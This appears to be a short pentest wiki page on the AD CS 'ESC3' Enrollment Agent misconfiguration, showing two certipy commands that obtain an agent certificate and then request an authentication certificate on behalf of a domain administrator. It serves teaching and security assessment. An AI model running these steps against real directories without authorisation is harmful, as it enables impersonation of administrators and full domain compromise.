---
title: 'ESC3: The "Enrollment Agent" Loophole'
description: 'ESC3: The "Enrollment Agent" Loophole.'
---

# ESC3: The "Enrollment Agent" Loophole

ESC3 happens when an organization tries to be organized and delegates certificate enrollment, but does it poorly. 

A certificate template specifies the **Certificate Request Agent** EKU (often called an Enrollment Agent). This EKU's sole purpose in life is to allow the holder to request certificates on behalf of *other* users. 

If a low-privileged user can enroll in an Enrollment Agent template, they can use the resulting certificate to request a secondary certificate (from a different template) on behalf of a Domain Admin. It's a two-step dance to domain compromise.

## The Attack Path

### 1. Get the Agent Certificate
First, you need to request a certificate based on the vulnerable Enrollment Agent template (let's call it `ESC3`).
```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
```
*Result*: You now have `john.pfx`, a valid Enrollment Agent certificate.

### 2. Enroll on Behalf of the Admin
Now, you use `john.pfx` to request a standard user authentication certificate (like the default `User` template), but you specify that you are doing it *on behalf of* the Administrator.
```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
```

!!! tip
    The second template (`User` in this example) doesn't even need to be vulnerable to anything. It just needs to allow Client Authentication. Your ESC3 Enrollment Agent certificate gives you the magical authority to bypass normal checks.
